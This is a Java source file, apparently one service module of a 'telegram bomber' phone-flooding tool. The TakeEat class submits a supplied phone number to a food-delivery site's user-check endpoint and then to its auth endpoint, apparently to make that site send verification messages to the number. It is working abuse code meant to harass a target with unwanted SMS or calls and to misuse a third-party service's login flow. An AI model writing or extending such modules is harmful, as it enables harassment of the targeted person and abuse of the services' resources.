package com.example.webapp.telegram.bomber.services;


import java.io.IOException;

import com.example.webapp.telegram.bomber.services.utils.Callback;
import com.example.webapp.telegram.bomber.services.utils.Service;
import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.springframework.lang.NonNull;

public class TakeEat extends Service {

    public TakeEat() {
        setPhoneCode("7");
    }

    @Override
    public void run(OkHttpClient client, Callback callback) {
        client.newCall(new Request.Builder()
                .url("https://petrodv.takeeat.ru/ajax/user_check.php")
                .post(new FormBody.Builder()
                        .add("phone", format(phone, "+7 *** ***-**-**"))
                        .build())
                .build()).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) {
                client.newCall(new Request.Builder()
                        .url("https://petrodv.takeeat.ru/ajax/auth2.php")
                        .get()
                        .build()).enqueue(callback);
            }
        });
    }
}
